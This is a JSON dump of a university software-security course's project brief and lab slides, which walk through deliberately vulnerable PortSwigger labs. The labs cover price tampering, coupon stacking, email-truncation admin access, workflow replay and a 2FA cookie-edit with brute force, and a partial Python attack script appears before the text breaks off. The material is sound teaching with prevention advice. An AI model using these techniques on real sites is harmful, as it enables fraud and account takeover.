@@ -1,0 +1,1234 @@
+[
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\CET431_Project_Description.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": " \nDepartment of Computer Engineering Technology \nCET431 \u2013 Software Security \nFall 2026 - Project \nPage 1 of 3 \n\u25cf Plagiarism, cheating, or any form of academic dishonesty is strictly prohibited. All work submitted must be the student's own, and all \nexternal sources, such as code snippets, libraries, or academic papers, must be properly cited.  \n\u25cf If you encounter any issues or require clarifications related to the assignment, promptly communicate with the instructor or teaching \nassistant. Do not share your assignment solutions with classmates before the submission deadline.  \n \nSoftware Security Project Requirements \n1. Application: \nEach team must be composed of 6 members (3 Red Team and 3 Blue Team) . The team must design and build a small \ne-commerce website, \u201cSecureShop\u201d, and make it resistant to the vulnerabilities and attacks covered in this course. \nBoth the features and the security of the website are graded. \nEach feature is a possible entry point for an attacker, so everyone is part of the website\u2019s attack surface: every point \nwhere an attacker can send input or trigger an action, such as forms, URLs, request parameters and admin pages. \n2. Functional Requirements: \nThe website must include the following features (points are out of 100, see item 8): \no Registration and login: create an account, confirm it, log in and log out (5) \no Product catalogue: product list and detail pages, with search or filtering (4) \no Shopping cart: add, remove and change quantity; the cart is kept during the session (4) \no Coupons and newsletter: apply coupon codes at checkout; newsletter signup issues a coupon (3) \no Checkout and orders: pay with store credit, show an order confirmation, keep order history (5) \no User account page: view and update profile details, and view own orders (3) \no Admin panel: manage users, products and coupons (4) \no Usability: clear navigation, helpful error messages, works on desktop and mobile (2) \nA missing or broken feature cannot be made up for by strong security. Extra features beyond this list can earn bonus \npoints if they work well and are secured. \n3. Security Requirements: \nThe website must be protected against every vulnerability and attack taught in the course. \n \nFor each topic, students must show that the attack works against a naive implementation and fails against their own. \no Apply each topic to every feature where it is relevant, not just one. \no Build the defenses into the application itself. Do not rely on the environment or on hidden pages for protection. \no Test with unexpected input and unexpected sequences of actions, not only the normal path. \no Keep a Security Coverage Matrix  throughout the project, with one row per topic: the attack scenario in \nSecureShop, the root cause, the defense implemented, where it is in the code, and the evidence. \n \n "
+      },
+      {
+        "page": 2,
+        "text": "Page 2 of 3 \n4. Security Testing: \nStudents must test their own website the way an attacker would: \no Step 1, self -test: using the testing tools from the labs, try to break the website for every row of the Security \nCoverage Matrix. Fix what breaks and keep the evidence. \no Step 2, Red Team vs Blue Team: the 3 Red Team members attack the website built by the Blue Team within a \nfixed time window and report each finding: what was tried, the request used, the result, and the severity. The \nBlue Team members then fix valid findings and document them. \n5. Project Documentation: \nStudents must submit: \no Source code in a Git repository, with a meaningful commit history from every team member \no README with setup steps, test accounts (a normal user and an admin), and a one-page architecture overview \no Security Design Report (about 8-12 pages): threat model (assets, entry points, attackers) and the complete \nSecurity Coverage Matrix \no Attack Evidence Report: evidence that each attack taught in the course fails against the team\u2019s website \no Red Team Penetration Test Report on the team\u2019s own website \n6. Demonstration: \nStudents must demonstrate a working website in a live demo (10 -15 minutes) followed by Q&A. Each team member \nmust answer questions about their own part. \n7. Grading: \nThe project is scored out of 100 and converted to 20 marks. Each phase is scored with the areas that apply to it, and the \nresult is converted to that phase\u2019s marks (5 for Phase 1, awarded at the Week 10 discussion, and 15 for Phase 2). \nArea Points What earns full marks \nFeatures and functionality (item 2) 30 Every required feature works end to end and is easy to use. \nSecurity coverage (item 3) 35 \nEvery topic taught is defended in every relevant feature. Points \nare shared equally across topics unless the instructors \nannounce otherwise. \nSecurity Design Report 10 Clear threat model, and a complete matrix linking each defense \nto its root cause. \nAttack evidence and Red Team \npenetration test 10 Convincing evidence and reproducible, well-written findings. \nCode quality and architecture 5 Clean, organized, documented code that runs from the \nREADME. \nDemo and individual Q&A 10 A clear demo, and every member can explain their own work. \nBonus up to +5 Extra features or advanced security work that is well explained. "
+      },
+      {
+        "page": 3,
+        "text": "Page 3 of 3 \n \n \n8. Rules and Ethics: \no Attack only your own team\u2019s website, inside the course environment and within the agreed time window. \no Never test real websites, other students\u2019 machines, or university systems without written permission. Do not use \nthe skills from this course against systems you do not own or are not authorized to test. \no Libraries and public documentation may be used if cited, but copying another team\u2019s code is academic \nmisconduct. Every member must be able to explain every line submitted. \nImportant dates: \n1. Week 9: Project Phase 1 submission. Requirements and design, threat model, and a first working version with defenses for the topics taught so far. \n2. Week 10: Project Phase 1 discussion (5 marks). Each team discusses its Phase 1 work with the instructors, and every member must be able to explain their \nown part. \n3. Week 14: Project Phase 2 (15 marks). Complete website, Security Coverage Matrix, all reports, Red Team testing, and live demo. Phase  2 builds on Phase \n1, so fix the issues raised in Phase 1 before the final submission. \n "
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lab 1.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "Software Security\nLab 1\n\u00a9 Eng. Ahmed Awad & Eng. Manal Amr\nAhmed.awad@sut.edu.eg\nManal.gafar@sut.edu.eg\nCET431"
+      },
+      {
+        "page": 2,
+        "text": "Table of Contents\n\u25cf What is PortSwigger?\n\u25cf HTTP Basics\n\u25cf Burp Suite\n\u25cf What Are Business Logic Vulnerabilities?\n\u25cf Lab 1: Excessive Trust in Client-Side Controls"
+      },
+      {
+        "page": 3,
+        "text": "What is PortSwigger?"
+      },
+      {
+        "page": 4,
+        "text": "What is PortSwigger?\n\u25cf PortSwigger is the industry-standard web application security testing toolkit.\n\u25cf It also runs the Web Security Academy: a free, hands-on training platform used by \nstudents, bug bounty hunters, and professional penetration testers worldwide.\n\u25cf The Academy pairs clear written theory with real, deliberately vulnerable lab \nenvironments \u2014 so you learn by actually exploiting the bug, not just reading about \nit.\n\u25cf This course's labs are taken directly from the Academy."
+      },
+      {
+        "page": 5,
+        "text": "HTTP Basics"
+      },
+      {
+        "page": 6,
+        "text": "HTTP Basics\nHTTP Headers\n\u25cf A request has 3 parts: Method, Path, Host\n\u25cf GET = retrieve a page\n\u25cf POST = send data (like a login form)\n\u25cf Example: GET /login HTTP/1.1\nGET /login HTTP/1.1\nHost: www.example.com\nUser-Agent: Mozilla/5.0\nAccept: text/html\nAccept-Language: en-US\nContent-Type: application/json\nCookie: sessionid=xyz789"
+      },
+      {
+        "page": 7,
+        "text": "HTTP Basics\nPage - 7\nCode Name What it Means Hacker's Takeaway\n200 OK Request succeeded. Server returned the requested \nresource.\nEndpoint is live. Inspect the response \nbody for data leaks.\n301 Moved Permanently Resource has permanently moved to a new URL \n(check the Location header).\nFollow the redirect - new URL may \nexpose a different attack surface.\n400 Bad Request Server rejected the request - malformed syntax or \ninvalid input.\nValidation exists - tweak your \npayloads to bypass it.\n401 Unauthorized Authentication required. No valid credentials were \nprovided.\nProtected resource found - target it \nwith brute force.\n403 Forbidden Server understood the request but refuses. Logged \nin, but not allowed.\nResource exists! Try privilege \nescalation or access control \nbypasses.\n404 Not Found The requested resource does not exist on the \nserver.\nUseful for directory enumeration -\nconfirms endpoints don't exist.\n500 Internal Server Error Server crashed while processing the request -\nsomething broke on the backend.\nYour input triggered a crash! May \nreveal injection or logic flaws."
+      },
+      {
+        "page": 8,
+        "text": "Burp Suite"
+      },
+      {
+        "page": 9,
+        "text": "Burp Suite\n\u25cf Developed by PortSwigger\n\u25cf Acts as a powerful Man-in-The-Middle proxy for complete visibility of HTTP \nRequests\n\u25cf Designed to hunt critical vulnerabilities: XSS, SQL injection, and Directory \nTraversal\n"
+      },
+      {
+        "page": 10,
+        "text": "Burp Suite Installation\nDownload Burp Suite Community Edition \u2013 PortSwigger\nhttps://portswigger.net/burp/communitydo\nwnload\nChoose the Community Edition (Free)\nSelect your OS: Windows / MacOS\nBrowser Configuration\nAdd \u201cFoxy Proxy\u201d Extension to \nyour browser, then\u2026\nBurp listens on 127.0.0.1:8080\nOpen Foxy Proxy Extension\nSet HTTP Proxy: 127.0.0.1, Port: 8080\nInstall Burp's CA Certificate so it can read \nHTTPS traffic\n.\n"
+      },
+      {
+        "page": 11,
+        "text": "Burp Suite Installation\n.\n\u25cf With the proxy configured, open \nFirefox and go to: \nhttp://burpsuite\n\u25cf Click \"CA Certificate\" and \ndownload it\n\u25cf In Firefox: Settings \u2192\nPrivacy & Security \u2192\nCertificates \u2192 View \nCertificates\n\u25cf Click Import, select the \ndownloaded file\n\u25cf Check both trust boxes \u2192 OK\nWhy is this needed? \nWebsites use HTTPS, which encrypts traffic.\nWithout Burp's certificate, your browser will block\nBurp from reading encrypted traffic. The\ncertificate tells your browser: \"Trust Burp Suite it's\nallowed to intercept.\""
+      },
+      {
+        "page": 12,
+        "text": "What is a Proxy?\n\u2022 A proxy sits between your browser and the \ninternet.\n\u2022 It intercepts requests before they leave your \ncomputer.\n\u2022 Burp catches requests so you can read, edit, \nand replay them\n"
+      },
+      {
+        "page": 13,
+        "text": "What is the Site \nMap? \n\u2022 As you browse a website through Burp's \nproxy, Burp automatically records every page \nand request you visited. \n\u2022 This is called the Site Map - it builds a visual \ntree of the website's structure.\n\u2022 Useful for recon - finding hidden pages and \nAPI endpoints\n"
+      },
+      {
+        "page": 14,
+        "text": "What is \nRepeater? \n\u2022 Repeater lets you take a single HTTP request \nand send it over and over, modifying it each \ntime. Instead of re-doing an action in the \nbrowser, you can tweak the request directly \nand instantly see the server's response\nHow it works:\n\u25cf Go to Proxy \u2192 HTTP history\n\u25cf Find a request you want to experiment with\n\u25cf Right-click \u2192 Send to Repeater (Or CTRL + R)\n\u25cf Go to the Repeater tab\n\u25cf You'll see the raw request on the left\n\u25cf Modify anything you want (a parameter, a header, \netc.)\n\u25cf Click Send\n\u25cf The response appears on the right\n"
+      },
+      {
+        "page": 15,
+        "text": "What is \nIntruder? \n\u2022 Intruder is Burp's automated attack tool. You \ntake a request, mark one or more values as \npayload positions (spots to inject), give it a list \nof values, and Intruder will automatically send \nthe request for every value in your list.\nHow it works:\n\u25cf Capture a request in Proxy \u2192 HTTP history\n\u25cf Right-click \u2192 Send to Intruder (OR CTRL + i)\n\u25cf Go to Intruder \u2192 Positions\n\u25cf Burp auto-highlights guessed positions - click Clear \u00a7 to remove \nthem\n\u25cf Highlight the value you want to fuzz, click Add \u00a7\n\u25cf Go to Payloads tab\n\u25cf Add your payload list (type manually or load a file)\n\u25cf Click Start Attack\n\u25cf Watch the results - look for different Status Codes or \nResponse Lengths\n"
+      },
+      {
+        "page": 16,
+        "text": "What Are Business Logic Vulnerabilities?"
+      },
+      {
+        "page": 17,
+        "text": "Business Logic Vulnerabilities\n\u25cf Flaws in an app's design/implementation that let an attacker trigger unintended \nbehavior by misusing legitimate functionality.\n\u25cf They arise from flawed assumptions about how users (and attackers) will \ninteract with the system \u2014 not from a broken line of code.\n"
+      },
+      {
+        "page": 18,
+        "text": "Business Logic Vulnerabilities\n1. Excessive trust in client-side controls  \u2190  today's lab\n2. High-level logic vulnerability\n3. Inconsistent security controls\n4. Flawed enforcement of business rules\n5. Low-level logic flaw\n6. Inconsistent handling of exceptional input\n7. Weak isolation on a dual-use endpoint\n8. Insufficient workflow validation\n9. Authentication bypass via flawed state machine\n10. Infinite money logic flaw\n11. Authentication bypass via encryption oracle"
+      },
+      {
+        "page": 19,
+        "text": "Lab 1: Excessive Trust in Client-Side \nControls"
+      },
+      {
+        "page": 20,
+        "text": "Business Logic Vulnerabilities\nObjective: buy the \u201cLightweight l33t leather jacket\u201d even though its price is far above your available store credit.\nCredentials: log in with wiener : peter\nThe bug: the shop sends the item's price to the server as a normal, editable request parameter \u2014 and the server trusts it \ninstead of recalculating the real price itself.\nLab link: portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls\n"
+      },
+      {
+        "page": 21,
+        "text": "Attempt the \nNormal Purchase\nSTEP 1 / 5\n\u25cf With Burp running and your browser's traffic proxied \nthrough it, log in as wiener : peter.\n\u25cf Open the \u201cLightweight l33t leather jacket\u201d product \npage and click Buy now.\n\u25cf The order is rejected: your store credit ($100) is \nnowhere near the item's price ($1,337).\n\u25cf This confirms the app enforces the price check \u2014 the \nquestion is where.\n"
+      },
+      {
+        "page": 22,
+        "text": "Inspect the Request \nin Burp Proxy\nSTEP 2 / 5\n\u25cf In Burp, go to Proxy \u2192 HTTP history and find the POST \n/cart request created when the item was added to \nyour cart.\n\u25cf Inspect its body: it includes productId, quantity \u2014 and \na price parameter, sent in cents, straight from the \nbrowser.\n\u25cf Right-click the request \u2192 \u201cSend to Repeater\u201d (or \nCtrl/Cmd+R) to move it somewhere we can freely edit \nand resend it.\n"
+      },
+      {
+        "page": 23,
+        "text": "Tamper With the \nPrice in Repeater\nSTEP 3 / 5\n\u25cf In the Repeater request pane, change price from \n133700 to a low value such as 1 (still in cents).\n\u25cf Click Send.\n\u25cf Check the Response panel: the server echoes back the \ncart with your new price \u2014 no server-side validation \nrejected it.\n"
+      },
+      {
+        "page": 24,
+        "text": "Confirm the Price \nChange in the Cart\nSTEP 4 / 5\n\u25cf Switch back to the browser and refresh /cart.\n\u25cf The jacket now shows the tampered price (e.g. $0.01) \ninstead of $1,337.00.\n\u25cf Repeat the Repeater edit if needed to set any price \ncomfortably below your $100 store credit.\n"
+      },
+      {
+        "page": 25,
+        "text": "Complete the Order & \nSolve the Lab\nSTEP 5 / 5\n\u25cf Click Place order / checkout with the tampered price \nstill applied.\n\u25cf The purchase now succeeds, since it is comfortably \nwithin your store credit.\n\u25cf Burp / the Academy confirms: \u201cCongratulations, you \nsolved the lab!\u201d\n"
+      },
+      {
+        "page": 26,
+        "text": "Root Cause & How to Prevent It\nNever trust data that only the client can see or control \u2014 recompute prices, quantities, and totals from the server's \nown source of truth on every request.\n"
+      },
+      {
+        "page": 27,
+        "text": "Thank you"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lab_2_updated.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "Software Security\nLab 2\n\u00a9 Eng. Ahmed Awad & Eng. Manal Amr\nAhmed.awad@sut.edu.eg\nManal.gafar@sut.edu.eg\nCET431"
+      },
+      {
+        "page": 2,
+        "text": "Table of Contents\n\u25cf Lab 2.1: Flawed Enforcement of Business Rules\n\u25cf Lab 2.2: Inconsistent Handling of Exceptional Input\n\u25cf Lab 2.3: Insufficient Workflow Validation\n\u25cf Lab Assessment"
+      },
+      {
+        "page": 3,
+        "text": "Business Logic Vulnerabilities\n1. Excessive trust in client-side controls  \n2. High-level logic vulnerability\n3. Inconsistent security controls\n4. Flawed enforcement of business rules \u2190  Lab 2.1\n5. Low-level logic flaw\n6. Inconsistent handling of exceptional input \u2190  Lab 2.2\n7. Weak isolation on a dual-use endpoint\n8. Insufficient workflow validation \u2190  Lab 2.3\n9. Authentication bypass via flawed state machine\n10. Infinite money logic flaw\n11. Authentication bypass via encryption oracle"
+      },
+      {
+        "page": 4,
+        "text": "Lab 2.1: Flawed Enforcement of Business \nRules"
+      },
+      {
+        "page": 5,
+        "text": "Lab 2.1: Objective\n\u25cf Objective: exploit the coupon logic in the purchasing workflow to buy the \u201cLightweight l33t leather jacket\u201d.\n\u25cf Credentials: wiener : peter\n\u25cf The bug: the app only rejects a coupon if it is the same as the last one applied, so alternating between two codes applies \nthem repeatedly.\n\u25cf Lab link: portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules\n1. Collect 2 coupons\n 2. Add jacket, checkout\n 3. Alternate the codes\n 4. Place order"
+      },
+      {
+        "page": 6,
+        "text": "Collect the \nCoupon Codes\nSTEP 1 / 4\n\u25cf Log in and notice the coupon code NEWCUST5 shown on \nthe site.\n\u25cf At the bottom of the page, sign up to the newsletter.\n\u25cf You receive a second coupon code: SIGNUP30.\n"
+      },
+      {
+        "page": 7,
+        "text": "Apply Both \nCoupons\nSTEP 2 / 4\n\u25cf Add the leather jacket to your cart.\n\u25cf Go to the checkout and apply both coupon codes.\n\u25cf The order total drops by a discount for each code.\n"
+      },
+      {
+        "page": 8,
+        "text": "Bypass the \nCoupon Check\nSTEP 3 / 4\n\u25cf Apply the same code twice in a row: it is rejected as \nalready applied.\n\u25cf Now alternate between the two codes: NEWCUST5, \nSIGNUP30, NEWCUST5, SIGNUP30 \u2026\n\u25cf Each one is accepted, so the discount keeps stacking.\n"
+      },
+      {
+        "page": 9,
+        "text": "Reduce the \nTotal & Order\nSTEP 4 / 4\n\u25cf Keep alternating the codes until the total is below your \nstore credit.\n\u25cf Click Place order.\n\u25cf The lab shows \u201cCongratulations, you solved the lab!\u201d\n"
+      },
+      {
+        "page": 10,
+        "text": "Lab 2.1: Root Cause & How to Prevent It\nRoot cause\n\u25cf The rule \u201ceach coupon can be used once\u201d is enforced \nbadly: only the most recent code is remembered.\n\u25cf The developer assumed users would apply codes in a \nsimple sequence, not alternate them.\n\u25cf No cap exists on the total discount.\nHow to prevent it\n\u25cf Store all applied coupons on the order and reject any code \nalready in that set.\n\u25cf Enforce limits server-side: one use per code, and a cap on \nthe maximum discount.\n\u25cf Re-validate the full cart, discounts and total at checkout.\n\u25cf Test business rules with unexpected sequences, not only \nthe happy path."
+      },
+      {
+        "page": 11,
+        "text": "Lab 2.2: Inconsistent Handling of \nExceptional Input"
+      },
+      {
+        "page": 12,
+        "text": "Lab 2.2: Objective\n\u25cf Objective: access the admin panel and delete the user carlos.\n\u25cf The bug: registration accepts a very long email address, but the app stores only the first 255 characters. A crafted address \ncan end up as @dontwannacry.com after truncation.\n\u25cf Lab link: portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input\n1. Find /admin\n 2. Register with 200+ char \nemail\n 3. Craft email truncated at 255\n 4. Delete carlos"
+      },
+      {
+        "page": 13,
+        "text": "Find the Admin \nPanel\nSTEP 1 / 5\n\u25cf With Burp proxying, go to Target \u2192 Site map, right-click \nthe lab domain \u2192 Engagement tools \u2192 Discover content.\n\u25cf Click \u201cSession is not running\u201d and wait. The path /admin is \ndiscovered.\n\u25cf Site map tab still records every page you browse through \nBurp, but it only shows pages you or the app requested. It \nwon't reveal hidden paths on its own.\n\u25cf Browse to /admin: access is denied, but the message says \nDontWannaCry users have access.\n\u25cf Community Edition: just browse to /admin directly.\n"
+      },
+      {
+        "page": 14,
+        "text": "Get Your Email \nID\nSTEP 2 / 5\n\u25cf Open the account registration page. It tells DontWannaCry \nemployees to use their company email address.\n\u25cf From the button in the lab banner, open the Email client.\n\u25cf Note the unique ID in your email server domain: @YOUR-\nEMAIL-ID.web-security-academy.net.\n"
+      },
+      {
+        "page": 15,
+        "text": "Register a Long \nEmail\nSTEP 3 / 5\n\u25cf Register with an email whose local part is at least 200 \ncharacters long.\n\u25cf In the Email client, click the link in the confirmation email \nto complete registration.\n"
+      },
+      {
+        "page": 16,
+        "text": "Craft the \nTruncated Email\nSTEP 4 / 5\n\u25cf Log in and open My account: your email has been \ntruncated to 255 characters.\n\u25cf Log out and go back to the registration page.\n\u25cf Register with another long email that includes \ndontwannacry.com as a subdomain.\n\u25cf Size the string so the \u201cm\u201d at the end of \n@dontwannacry.com is exactly character 255.\n\u25cf Click the confirmation link, log in, and notice you now have \nadmin access.\n"
+      },
+      {
+        "page": 17,
+        "text": "Delete carlos\nSTEP 5 / 5\n\u25cf The confirmation email reached your inbox, but the server \ntruncated the stored address to 255 characters.\n\u25cf The truncated address looks like a valid \n@dontwannacry.com address.\n\u25cf Go to the admin panel and delete carlos.\n\u25cf The lab shows \u201cCongratulations, you solved the lab!\u201d\n"
+      },
+      {
+        "page": 18,
+        "text": "Lab 2.2: Root Cause & How to Prevent It\nRoot cause\n\u25cf The app handles the same input differently in different \nplaces: the full address is used to send the email, but only \n255 characters are stored.\n\u25cf The developer assumed users would never enter an email \nthat long.\n\u25cf Admin access is granted from the email domain, so the \ntruncated value passes the check.\nHow to prevent it\n\u25cf Enforce one maximum length at the start and reject over-\nlong input instead of silently truncating it.\n\u25cf Validate the exact value that will be stored and used.\n\u25cf Do not grant privileges from an email domain; assign roles \nexplicitly.\n\u25cf Test exceptional input: very long, empty, and special \nvalues."
+      },
+      {
+        "page": 19,
+        "text": "Lab 2.3: Insufficient Workflow Validation"
+      },
+      {
+        "page": 20,
+        "text": "Lab 2.3: Objective\n\u25cf Objective: buy the \u201cLightweight l33t leather jacket\u201d by abusing the purchasing workflow.\n\u25cf Credentials: wiener : peter\n\u25cf The bug: the app assumes users reach the order confirmation page only after a successful checkout and does not verify that \nthe order was paid for.\n\u25cf Lab link: portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation\n1. Buy an affordable item\n 2. Capture order-confirmation \nrequest\n 3. Add jacket to cart\n 4. Replay confirmation"
+      },
+      {
+        "page": 21,
+        "text": "Buy a Cheap \nItem\nSTEP 1 / 4\n\u25cf With Burp running, log in as wiener : peter.\n\u25cf Buy any item that you can afford with your store credit.\n"
+      },
+      {
+        "page": 22,
+        "text": "Study the Order \nFlow\nSTEP 2 / 4\n\u25cf Open Proxy \u2192 HTTP history.\n\u25cf When you place an order, POST /cart/checkout redirects \nyou to an order confirmation page.\n\u25cf Send GET /cart/order-confirmation?order-\nconfirmation=true to Burp Repeater.\n"
+      },
+      {
+        "page": 23,
+        "text": "Add the Jacket \nto Your Cart\nSTEP 3 / 4\n\u25cf In the browser, add the \u201cLightweight l33t leather jacket\u201d to \nyour basket.\n\u25cf Do not go through checkout: its price is far above your \nstore credit.\n"
+      },
+      {
+        "page": 24,
+        "text": "Replay the \nConfirmation\nSTEP 4 / 4\n\u25cf In Burp Repeater, resend the order-confirmation request.\n\u25cf The order completes without the cost being deducted from \nyour store credit.\n\u25cf The lab shows \u201cCongratulations, you solved the lab!\u201d\n"
+      },
+      {
+        "page": 25,
+        "text": "Lab 2.3: Root Cause & How to Prevent It\nRoot cause\n\u25cf The app does not validate the workflow: the confirmation \nstep can be requested without completing checkout.\n\u25cf It assumes users always follow the intended sequence of \nsteps.\n\u25cf Confirming the order never checks that payment was \nsuccessful.\nHow to prevent it\n\u25cf Track order state on the server and allow confirmation \nonly after payment succeeds.\n\u25cf Verify the cart total and payment at the final step, not just \nat checkout.\n\u25cf Bind confirmation to a unique, unguessable order ID tied \nto the user session.\n\u25cf Test by skipping, repeating and reordering steps of every \nworkflow."
+      },
+      {
+        "page": 26,
+        "text": "Thank you"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lab_3.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "Software Security\nLab 3  \u00b7  Authentication\n\u00a9 Eng. Ahmed Awad & Eng. Manal Amr\nAhmed.awad@sut.edu.eg\nManal.gafar@sut.edu.eg\nCET431"
+      },
+      {
+        "page": 2,
+        "text": "How to look, before you change anything\n1 Read the goal. Write whose account the lab asks you to reach, and which account is yours.\n2 Walk the happy path. Log in, or request a reset, as yourself. List every step the application \nexpects.\n3 Mark the trust boundary. In HTTP history, circle any field that names a user, a code, or a host. The \nserver should already know those facts.\n4 Write the assumption. One sentence: the designers believed the browser would only submit the \nvalue from the genuine session or the real site name."
+      },
+      {
+        "page": 3,
+        "text": "Lab 3.1   2FA broken logic"
+      },
+      {
+        "page": 4,
+        "text": "Lab 3.1  \u00b7  2FA Broken Logic \u2014 Overview\n1 The goal. Reach Carlos's account page without ever knowing his password.\n2 Your credentials. wiener : peter \u2014 plus an email client to read your own 2FA code.\n3 The feature. After a correct password, the app asks for a 4-digit code sent by email before it opens \nthe account page.\n4 The hint. Carlos never logs in himself during this lab \u2014 so every code must come from tricking the \nserver, not from watching him."
+      },
+      {
+        "page": 5,
+        "text": "Lab 3.1  \u00b7  The Vulnerability, Step by Step\nLog in as wiener\nPOST /login with valid credentials\nServer sets a cookie\nSet-Cookie: verify=wiener\nAttacker edits the cookie\nverify=wiener becomes verify=carlos\nServer generates a 2FA code\nThe code is now valid for carlos\nBrute-force the 4-digit code\nPOST /login2, mfa-code 0000\u20139999\n302 redirect\nLogged in as carlos"
+      },
+      {
+        "page": 6,
+        "text": "Lab 3.1  \u00b7  Steps 1\u20134: Hijack the Session\n1 1. Log in and observe. Sign in with wiener:peter and walk through 2FA. In POST /login2, the verify \nparameter says whose account is being checked.\n2 2. Log out. Clear the session so the next request starts the verification flow fresh.\n3 3. Hijack the cookie. In Burp Repeater, send GET /login2 and change verify=wiener to \nverify=carlos. The server now generates a 2FA code for Carlos.\n4 4. Re-open verification. Log in again as yourself, then deliberately submit a wrong 2FA code \u2014 this \ncleanly re-opens the second step."
+      },
+      {
+        "page": 7,
+        "text": "Lab 3.1  \u00b7  Steps 5\u20138: Brute-Force and Win\n1 5. Set up Intruder. Send the POST /login2 request to Burp Intruder.\n2 6. Configure the attack. Keep verify=carlos fixed; mark mfa-code as the payload position. Brute-\nforce all 4-digit values, 0000\u20139999.\n3 7. Spot the win. Every wrong guess returns the same 200 OK page. The correct code returns a 302 \nredirect \u2014 that's the signal.\n4 8. Finish. Load that 302 response in the browser and click My account \u2014 you're now logged in as \nCarlos."
+      },
+      {
+        "page": 8,
+        "text": "Lab 3.1  \u00b7  The 4 Key HTTP Requests\n1 1. POST /login. Submits wiener's real credentials. Look at the response, not the request \u2014 the \nheader Set-Cookie: verify=wiener is where the server first hands identity to the client.\n2 2. GET /login2 (normal). Loads the 2FA entry page. This request automatically carries Cookie: \nverify=wiener \u2014 nothing else in it proves who's asking.\n3\n3. GET /login2 (hijacked, in Repeater). The same request, but with the cookie edited to \nverify=carlos. Response: still 200 OK \u2014 the server silently generates a fresh code for Carlos, no \nextra check.\n4\n4. POST /login2 with mfa-code (brute-force). Repeated for every 4-digit value. Wrong guesses \nreturn 200 with the same page; the correct one returns 302 Found with Location: /my-account \u2014 \nthat's the signal."
+      },
+      {
+        "page": 9,
+        "text": "Lab 3.1  \u00b7  The verify Cookie \u2014 Root Cause\n1 What it is. Name: verify. Value: a plain username. The server sets it the moment a password check \nsucceeds \u2014 before any 2FA code exists.\n2 Where it's set. In the Set-Cookie header of the POST /login response. The server never revisits or \nre-signs this value after that point.\n3 Where it's read. Every request to /login2. The server trusts whatever username sits in this cookie \nto decide whose 2FA code to generate and check.\n4\nWhy it's the bug. The value is 100% client-controlled \u2014 anyone can open DevTools or Burp and \nrewrite it. A secure design tracks identity server-side in the session; this one hands it to the \nbrowser and trusts it back unchanged."
+      },
+      {
+        "page": 10,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 1/12\nImports, warnings, and Burp proxy config\nimport re\nimport sys\nfrom urllib.parse import urlparse, urljoin\nimport requests\nimport urllib3\nfrom bs4 import BeautifulSoup\nurllib3.disable_warnings(\n    urllib3.exceptions.InsecureRequestWarning\n)\nPROXIES = {\n    \"http\": \"http://127.0.0.1:8080\",\n    \"https\": \"http://127.0.0.1:8080\",\n}\n# Keep False for a direct connection.\n# Set True when Burp's listener is running on 127.0.0.1:8080.\nUSE_BURP = False"
+      },
+      {
+        "page": 11,
+        "text": "Lab 3.1  \u00b7  Libraries Used (1/2) \u2014 Standard Library\n1 re. Python's built-in regular-expression module. The script uses it to search the scraped email text \nfor a 4-digit number sitting near a word like \u2018verification\u2019 or \u2018MFA\u2019.\n2 sys. Gives access to sys.exit(), which the script calls to stop immediately with a clear error message \nif the lab URL or email URL look malformed.\n3\nurllib.parse (urlparse, urljoin). Breaks a URL into its pieces (scheme, host, path) and safely \nresolves a relative link against the page it came from \u2014 used to validate the target URL and to \nfollow links inside the email client."
+      },
+      {
+        "page": 12,
+        "text": "Lab 3.1  \u00b7  Libraries Used (2/2) \u2014 Third-Party Packages\n1 requests. The actual HTTP client. Every GET/POST, every cookie, the whole Session object \u2014 all of \nit comes from this one third-party library.\n2 urllib3. The lower-level library that requests is built on top of. Here it's used for exactly one thing: \nsilencing the \u2018insecure request\u2019 warning caused by disabling TLS verification.\n3 beautifulsoup4 (bs4). Parses raw HTML into a navigable tree, so the script can strip out \n<script>/<style> tags and pull out plain text and links from the login page and the email client."
+      },
+      {
+        "page": 13,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 2/12\nHelpers: set_verify() and extract_text()\ndef set_verify(session, hostname, username):\n    \"\"\"Set the verify cookie for the active lab host.\"\"\"\n    session.cookies.set(\n        \"verify\",\n        username,\n        domain=hostname,\n        path=\"/\",\n    )\ndef extract_text(html):\n    \"\"\"Return readable page text and the parsed HTML.\"\"\"\n    soup = BeautifulSoup(html, \"html.parser\")\n    for element in soup([\"script\", \"style\"]):\n        element.decompose()\n    return \"\\n\".join(\n        item.strip()\n        for item in soup.stripped_strings\n        if item.strip()\n    ), soup"
+      },
+      {
+        "page": 14,
+        "text": "Lab 3.1  \u00b7  Full Python Script (Email-Reading Version) CODE 3/12\nget_email_otp() 1/4 \u2014 open the email and prep\ndef get_email_otp(session, email_url):\n    \"\"\"\n    Open the provided PortSwigger Email client URL,\n    print its contents, and identify possible 4-digit codes.\n    \"\"\"\n    print(\"\\n[*] Opening Email client:\", email_url)\n    response = session.get(email_url, timeout=15)\n    print(\"[*] Email client status:\", response.status_code)\n    print(\"[*] Final URL:\", response.url)\n    response.raise_for_status()\n    email_text, soup = extract_text(response.text)\n    pages = [(\"Email client\", email_text)]\n    email_host = urlparse(response.url).netloc\n    visited = {response.url}\n    candidate_links = []\n    for link in soup.find_all(\"a\", href=True):\n        href = urljoin(response.url, link[\"href\"])\n        parsed_link = urlparse(href)"
+      },
+      {
+        "page": 15,
